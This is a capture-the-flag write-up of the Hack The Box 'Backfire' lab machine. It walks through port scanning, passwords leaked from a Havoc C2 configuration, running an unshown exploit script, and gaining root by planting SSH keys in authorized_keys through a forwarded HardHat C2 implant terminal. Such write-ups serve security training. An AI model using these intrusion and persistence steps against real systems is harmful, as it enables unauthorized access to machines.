# Backfire Write-up

<img src="https://labs.hackthebox.com/storage/avatars/aa0a93908243c51fe21e691fc6571911.png" width="200" height="200">

## Recon

### Port enumeration with Nmap

`nmap -sC -sV 10.10.11.49`

    PORT     STATE SERVICE    VERSION
    22/tcp   open  ssh        OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
    | ssh-hostkey:                                                                                                                                                                                                                              
    |_  256 be:f3:27:9e:c6:d6:29:27:7b:98:18:91:4e:97:25:99 (ED25519)                                                                                                                                                                           
    443/tcp  open  ssl/https?                                                                                                                                                                                                                   
    | ssl-cert: Subject: commonName=127.0.0.1/stateOrProvinceName=Florida/countryName=US                                                                                                                                                        
    | Subject Alternative Name: IP Address:127.0.0.1                                                                                                                                                                                            
    | Not valid before: 2024-05-30T05:03:56                                                                                                                                                                                                     
    |_Not valid after:  2027-05-30T05:03:56                                                                                                                                                                                                     
    |_ssl-date: TLS randomness does not represent time                                                                                                                                                                                          
    | tls-alpn:                                                                                                                                                                                                                                 
    |   http/1.1                                                                                                                                                                                                                                
    |   http/1.0                                                                                                                                                                                                                                
    |_  http/0.9                                                                                                                                                                                                                                
    8000/tcp open  http       nginx 1.22.1                                                                                                                                                                                                      
    |_http-server-header: nginx/1.22.1                                                                                                                                                                                                          
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel  

Use the `-p-` flag and perform a full scan of our target.

`nmap -sC -sV -p- 10.10.11.49`  

Add host to `/etc/hosts`.

    sudo echo "10.10.11.49 backfire.htb" | sudo tee -a /etc/hosts

backfire.htb:8000

![image](https://github.com/user-attachments/assets/5e076f97-4d39-4ff3-af45-2377e57cfbe8)

/havoc.yaotl

![image](https://github.com/user-attachments/assets/9f0e32e3-4fa7-4a70-8865-b90ea8066ae8)

Found the following credentials.

`ilya`:`CobaltStr1keSuckz!`

`sergej`:`1w4nt2sw1tch2h4rdh4tc2`

![image](https://github.com/user-attachments/assets/d1805006-5e85-4f1a-9d33-83d7cae3c9ee)

## Exploitation

    python3 exploit.py -t https://backfire.htb/ -u ilya -i <IP> -p <PORT>

![image](https://github.com/user-attachments/assets/e2cb4ea4-0b2a-4de6-a552-d7060499ff95)

![image](https://github.com/user-attachments/assets/827d0513-8c42-4819-b147-b1085a83b532)



![image](https://github.com/user-attachments/assets/82f4a9b2-9c91-4073-8c1a-48ed3aa41956)

![image](https://github.com/user-attachments/assets/b52ac504-6fa7-464f-8494-b12a93d2e952)

![image](https://github.com/user-attachments/assets/cf3404af-bbb9-4f06-ad1f-1c44458e619e)

Get the user flag!

![image](https://github.com/user-attachments/assets/2df4486d-44b6-4eb8-8d21-a68a4b68c2a5)

### Privilege escalation

ssh-keygen -t rsa -b 2048

mkdir -p ~/.ssh

echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys

chmod 700 ~/.ssh
chmod 600 ~/.ssh/authorized_keys

ssh -i path/to/key ilya@backfire.htb

![image](https://github.com/user-attachments/assets/ad920c2a-6319-4800-9670-c26db603f07c)

hardhat.txt

![image](https://github.com/user-attachments/assets/2a1d5164-195b-4861-80db-87ac07b0a1d7)

netstat -a

![image](https://github.com/user-attachments/assets/aca87839-8572-4d0c-a014-87aecfb5314d)

    ssh -i key ilya@backfire.htb -L 7096:127.0.0.1:7096 -L 5000:127.0.0.1:5000

![image](https://github.com/user-attachments/assets/1b267bef-b786-4810-b082-942911b9c0a9)

https://127.0.0.1:7096

![image](https://github.com/user-attachments/assets/78ea7bdf-f6c8-4e0f-a35c-1ce29bc65a33)

![image](https://github.com/user-attachments/assets/9d2b02fa-7e1f-4c2b-b2fc-1e1c6ed8e5cf)

![image](https://github.com/user-attachments/assets/1fc599fc-9ff5-4b2f-ab86-c01ee20dd626)

Open `/ImplantInteract` page add terminal.

![image](https://github.com/user-attachments/assets/70a60838-82a2-4bf1-8418-ce72dd50dc3e)

Scroll down and add our ssh public key with to `authorized_keys` via `echo` command.

    echo "YOUR_PUBLIC_KEY" >> ~/.ssh/authorized_keys


![image](https://github.com/user-attachments/assets/12eec708-9552-413a-a869-499bd31b7935)

    ssh -i key sergej@backfire.htb

![image](https://github.com/user-attachments/assets/9cc091f9-324f-46e4-a6c3-f603c9bdae06)

    ssh -i sshkey root@backfire.htb

![image](https://github.com/user-attachments/assets/d0fd61d7-825e-4c65-b819-3c786b1fc75e)

Get the root flag!

![image](https://github.com/user-attachments/assets/6c528e26-b74c-4172-8b37-370eaaea1b78)
